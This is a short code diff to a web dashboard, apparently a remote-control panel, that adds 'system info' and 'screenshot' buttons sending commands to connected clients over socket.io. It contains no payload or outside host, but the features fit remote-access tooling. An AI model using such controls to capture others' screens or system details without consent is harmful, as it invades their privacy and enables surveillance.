@@ -16,6 +16,8 @@
           <label class="cmd"></label>
           <button onclick="sayhi(${c})">say hi</button>
           <button onclick="sendoff(${c})">turn off</button>
+          <button onclick="systeminfo(${c})">system info</button>
+          <button onclick="screenshot(${c})">screenshot</button>
         </div>
         `;
       $('#list').append($(template));
@@ -39,6 +41,16 @@
     function sayhi(cl) {
       console.log('sayhi', cl);
       socket.emit('client:send', {sid: cl, cmd: 'hi'});
+    }
+
+    function systeminfo(cl) {
+      console.log('system info', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'systeminfo'});
+    }
+
+    function screenshot(cl) {
+      console.log('screenshot', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'screenshot'});
     }
   </script>
 </body>
